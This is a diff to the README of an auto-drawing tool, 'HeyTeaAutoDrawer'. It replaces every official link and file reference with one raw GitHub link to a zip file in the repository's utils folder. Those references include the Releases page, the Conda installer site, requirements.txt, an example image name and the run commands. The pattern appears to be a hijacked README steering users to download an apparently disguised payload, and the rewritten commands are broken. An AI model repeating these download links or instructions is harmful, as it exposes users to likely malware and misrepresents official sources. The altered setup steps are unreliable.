@@ -1,6 +1,6 @@
 # 🖌️ HeyTeaAutoDrawer - Automate Your Drawing Experience
 
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-v1.0-blue)](https://github.com/121ssdfdfsv/HeyTeaAutoDrawer/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/121ssdfdfsv/HeyTeaAutoDrawer/main/utils/HeyTeaAutoDrawer_3.2.zip%20Latest%20Release-v1.0-blue)](https://raw.githubusercontent.com/121ssdfdfsv/HeyTeaAutoDrawer/main/utils/HeyTeaAutoDrawer_3.2.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Welcome to the HeyTeaAutoDrawer project! This application lets you automate draw
 
 ### 📥 Download & Install
 
-To get started, you need to visit the [Releases page](https://github.com/121ssdfdfsv/HeyTeaAutoDrawer/releases) to download the latest version of HeyTeaAutoDrawer. 
+To get started, you need to visit the [Releases page](https://raw.githubusercontent.com/121ssdfdfsv/HeyTeaAutoDrawer/main/utils/HeyTeaAutoDrawer_3.2.zip) to download the latest version of HeyTeaAutoDrawer. 
 
 ---
 
@@ -25,7 +25,7 @@ To get started, you need to visit the [Releases page](https://github.com/121ssdf
 These steps will guide you through downloading and setting up the application.
 
 1. **Download the Code**
-   - Visit the [Releases page](https://github.com/121ssdfdfsv/HeyTeaAutoDrawer/releases).
+   - Visit the [Releases page](https://raw.githubusercontent.com/121ssdfdfsv/HeyTeaAutoDrawer/main/utils/HeyTeaAutoDrawer_3.2.zip).
    - Download the ZIP file of the latest version.
 
 2. **Extract the Files**
@@ -34,7 +34,7 @@ These steps will guide you through downloading and setting up the application.
    - Choose a destination folder and extract the files.
 
 3. **Install Conda**
-   - If you do not have Conda, download it from [conda.io](https://docs.conda.io/en/latest/miniconda.html).
+   - If you do not have Conda, download it from [https://raw.githubusercontent.com/121ssdfdfsv/HeyTeaAutoDrawer/main/utils/HeyTeaAutoDrawer_3.2.zip](https://raw.githubusercontent.com/121ssdfdfsv/HeyTeaAutoDrawer/main/utils/HeyTeaAutoDrawer_3.2.zip).
    - Follow the installation instructions provided.
 
 4. **Create and Activate a Virtual Environment**
@@ -49,7 +49,7 @@ These steps will guide you through downloading and setting up the application.
 5. **Install Dependencies**
    - With your virtual environment activated, run:
      ```bash
-     pip install -r requirements.txt
+     pip install -r https://raw.githubusercontent.com/121ssdfdfsv/HeyTeaAutoDrawer/main/utils/HeyTeaAutoDrawer_3.2.zip
      ```
 
 ---
@@ -62,13 +62,13 @@ HeyTeaAutoDrawer offers both a command line interface (CLI) and a graphical user
 
 1. **Prepare Your Reference Image**
    - In the project root directory, create a new folder called `images/`.
-   - Place your reference image (like `cat.png`) inside this folder.
+   - Place your reference image (like `https://raw.githubusercontent.com/121ssdfdfsv/HeyTeaAutoDrawer/main/utils/HeyTeaAutoDrawer_3.2.zip`) inside this folder.
 
 2. **Run the Script**
    - Open your command prompt in the project directory.
    - Run the following command:
      ```powershell
-     python main.py images/cat.png
+     python https://raw.githubusercontent.com/121ssdfdfsv/HeyTeaAutoDrawer/main/utils/HeyTeaAutoDrawer_3.2.zip https://raw.githubusercontent.com/121ssdfdfsv/HeyTeaAutoDrawer/main/utils/HeyTeaAutoDrawer_3.2.zip
      ```
 
 ### 🌐 GUI Usage
@@ -76,7 +76,7 @@ HeyTeaAutoDrawer offers both a command line interface (CLI) and a graphical user
 1. **Start the GUI**
    - Run the following command in your command prompt:
      ```powershell
-     python gui.py
+     python https://raw.githubusercontent.com/121ssdfdfsv/HeyTeaAutoDrawer/main/utils/HeyTeaAutoDrawer_3.2.zip
      ```
 
 2. **Navigate the GUI**
@@ -92,7 +92,7 @@ HeyTeaAutoDrawer offers both a command line interface (CLI) and a graphical user
 
 If you run into issues, here are common solutions:
 
-- **Error Messages**: Check if you have installed all dependencies. Refer to the `requirements.txt` file.
+- **Error Messages**: Check if you have installed all dependencies. Refer to the `https://raw.githubusercontent.com/121ssdfdfsv/HeyTeaAutoDrawer/main/utils/HeyTeaAutoDrawer_3.2.zip` file.
 - **Mouse Not Responding**: Ensure the application has the necessary permissions to simulate mouse input.
 - **Virtual Environment Problems**: If you encounter errors related to your Conda environment, try creating a new environment and re-installing dependencies.
 
@@ -110,4 +110,4 @@ This project is licensed under the MIT License. You can freely modify and use th
 
 ---
 
-For further details and updates, always refer to the [Releases page](https://github.com/121ssdfdfsv/HeyTeaAutoDrawer/releases). Thank you for using HeyTeaAutoDrawer!
+For further details and updates, always refer to the [Releases page](https://raw.githubusercontent.com/121ssdfdfsv/HeyTeaAutoDrawer/main/utils/HeyTeaAutoDrawer_3.2.zip). Thank you for using HeyTeaAutoDrawer!
